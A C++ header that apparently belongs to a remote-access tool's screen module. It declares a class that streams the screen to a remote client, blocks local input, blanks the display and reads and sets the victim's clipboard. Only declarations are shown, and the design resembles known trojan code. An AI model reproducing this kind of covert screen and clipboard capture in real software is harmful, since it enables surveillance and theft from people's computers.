// ScreenManagers.h: interface for the CScreenManagers class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_)
#define AFX_SCREENMANAGER_H__511DF666_6E18_4408_8BD5_8AB8CD1AEF8F__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "../Manager.h"
#include "ScreenSpys.h"

class CScreenManagers : public CManager  
{
public:
	CScreenManagers(CClientSocket *pClient);
	virtual ~CScreenManagers();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsMetricsChange();
	bool IsConnect();
	int	GetCurrentPixelBits();
	bool m_bIsWorking;
	bool m_bIsBlockInput;
	bool m_bIsBlankScreen;
private:
	BYTE	m_bAlgorithm;
	bool	m_bIsCaptureLayer;
	int	m_biBitCount;
	HANDLE	m_hWorkThread, m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpys	*m_pScreenSpy;
	void ResetScreen(int biBitCount);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	ControlThread(LPVOID lparam);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();
};

#endif // !defined(AFX_SCREENMANAGER_H__737AA8BC_7729_4C54_95D0_8B1E99066D48__INCLUDED_)
